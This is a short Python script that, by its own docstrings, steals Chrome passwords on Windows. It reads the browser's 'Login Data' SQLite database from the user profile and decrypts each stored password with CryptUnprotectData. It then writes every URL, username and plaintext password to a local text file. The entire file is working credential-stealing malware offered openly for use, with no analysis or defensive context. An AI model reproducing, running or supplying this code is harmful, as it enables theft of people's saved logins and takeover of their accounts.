#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file steal chrome password on Windows. """

###################
#    This file steal chrome password on Windows.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from os import environ, path
from sys import argv
from win32crypt import CryptUnprotectData
import sqlite3


class ChromePasswordsStealer:

    """ This class steal chrome passwords on Windows. """

    def __init__(self, filename: str = "passwords.txt"):
        self.path = path.join(
            environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Default",
            "Login Data",
        )
        self.connection = sqlite3.connect(self.path)
        self.cursor = self.connection.cursor()
        self.requete = "SELECT origin_url, username_value, password_value FROM logins"
        self.filename = filename

    def decrypt_and_save(self) -> None:

        """ This function decrypt the password file and get passwords. """

        file = open(self.filename, "a")
        for (
            url,
            user,
            password,
        ) in self.cursor.execute(self.requete):
            try:
                description, password = CryptUnprotectData(
                    password, None, None, None, 0
                )
                file.write(f"{url} : LOGIN {user}, PASSWORD : {password}\n")
            except Exception as e:
                print(e)
                pass
        file.close()


def main() -> None:
    if len(argv) > 1:
        filename = argv[1]
    else:
        filename = "passwords.txt"

    stealer = ChromePasswordsStealer(filename = filename)
    stealer.decrypt_and_save()


if __name__ == "__main__":
    main()
